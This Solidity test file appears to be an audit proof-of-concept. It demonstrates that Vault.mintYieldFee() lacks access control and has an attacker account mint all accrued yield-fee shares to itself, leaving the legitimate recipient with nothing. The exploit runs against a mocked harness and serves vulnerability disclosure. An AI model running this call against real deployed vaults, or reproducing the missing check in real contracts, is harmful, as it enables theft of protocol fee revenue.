// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

/**
 * @title ExploitTest
 * @notice Proof-of-Concept that demonstrates how anyone can steal accrued
 *         yield-fee shares by abusing the missing access-control on
 *         Vault.mintYieldFee().
 *
 * The vulnerability (see annotation 003) is that the external function
 * `mintYieldFee(uint256 _shares, address _recipient)` can be called by **any
 * address** and allows the caller to choose an arbitrary recipient.  The
 * function was supposed to be callable only by the protocol (or at the very
 * least restricted to mint to the `_yieldFeeRecipient` that was configured at
 * deployment).  Because of the missing check, an attacker can mint the whole
 * accrued fee supply to themselves and drain the vault of its fee revenue.
 *
 * Attack outline implemented below:
 * 1. The test environment accrues some yield and performs a liquidation, which
 *    causes `_increaseYieldFeeBalance()` to accrue fee shares inside the
 *    vault (stored in the private variable `_yieldFeeTotalSupply`).  No fee
 *    shares are minted yet – they are waiting for `mintYieldFee()` to be
 *    called.
 * 2. A malicious user (bob) simply calls `mintYieldFee()` specifying their own
 *    address as the recipient.
 * 3. All fee shares are transferred to bob, depriving the legitimate
 *    `yieldFeeRecipient()` of any revenue.
 *
 * The exploit succeeds if bob’s vault-share balance increases by the exact
 * amount that was previously stored in `yieldFeeTotalSupply()` and the value
 * of `yieldFeeTotalSupply()` becomes zero afterwards.
 */

import { UnitBaseSetup } from "test/utils/UnitBaseSetup.t.sol";
import { Helpers } from "test/utils/Helpers.t.sol";
import { IERC20 } from "openzeppelin/token/ERC20/IERC20.sol";
import { Math } from "openzeppelin/utils/math/Math.sol";

contract ExploitTest is UnitBaseSetup {
  /*
   * ===== Exploit preparation =====
   * We override the `setUp` from UnitBaseSetup and keep its behaviour while
   * adding protocol-realistic parameters (non-zero fee percentage and
   * liquidation pair registration).
   */
  function setUp() public override {
    super.setUp(); // initialise the full testing scaffold

    // Configure a non-zero yield fee so that liquidations will accrue fee
    // shares.  `address(this)` is the owner of the vault in this harness, so
    // we are authorised to do so (mirrors real deployment where the owner
    // would have set this during construction).
    vault.setYieldFeePercentage(YIELD_FEE_PERCENTAGE);

    // Register the liquidation pair so that the mock router can interact with
    // the vault.
    _setLiquidationPair();
  }

  /**
   * @notice Executes the exploit described above and asserts success.
   */
  function testExploitStealYieldFee() public {
    /******************************
     * 1. Honest user interaction *
     ******************************/

    // Alice deposits some underlying into the vault.
    uint256 depositAssets = 1_000e18;
    underlyingAsset.mint(alice, depositAssets);

    vm.startPrank(alice);
    underlyingAsset.approve(address(vault), type(uint256).max);
    vault.deposit(depositAssets, alice);
    vm.stopPrank();

    // Simulate yield accruing in the YieldVault by minting extra underlying.
    uint256 simulatedYield = 100e18;
    _accrueYield(underlyingAsset, yieldVault, simulatedYield);

    // Determine how much yield can be liquidated so that the call certainly
    // succeeds (<= liquidatable balance returned by the contract).
    uint256 maxLiquidatable = vault.liquidatableBalanceOf(address(vault));
    require(maxLiquidatable > 0, "no liquidatable yield");

    uint256 yieldToLiquidate = maxLiquidatable / 2; // use half to stay well within limits

    // Fund bob with enough prize tokens to perform the swap.
    prizeToken.mint(bob, 1e24);

    vm.startPrank(bob);
    _liquidate(liquidationRouter, liquidationPair, prizeToken, yieldToLiquidate, bob);
    vm.stopPrank();

    // The vault should now have accrued fee shares.
    uint256 feeSharesAccrued = vault.yieldFeeTotalSupply();
    assertGt(feeSharesAccrued, 0, "no fee shares accrued");

    /******************************
     * 2. The actual exploitation *
     ******************************/

    // Bob steals the entire fee by minting the shares to himself.
    uint256 bobBalanceBefore = vault.balanceOf(bob);
    vm.prank(bob);
    vault.mintYieldFee(feeSharesAccrued, bob);
    uint256 bobBalanceAfter = vault.balanceOf(bob);

    /*****************
     * 3. Assertions *
     *****************/

    // Bob’s balance increased by the exact fee amount.
    assertEq(bobBalanceAfter - bobBalanceBefore, feeSharesAccrued, "incorrect fee share transfer to bob");

    // The fee supply is now depleted.
    assertEq(vault.yieldFeeTotalSupply(), 0, "fee supply not fully drained");

    // The legitimate fee recipient received nothing.
    assertEq(
      vault.balanceOf(vault.yieldFeeRecipient()),
      0,
      "legitimate fee recipient unexpectedly received shares"
    );
  }
}
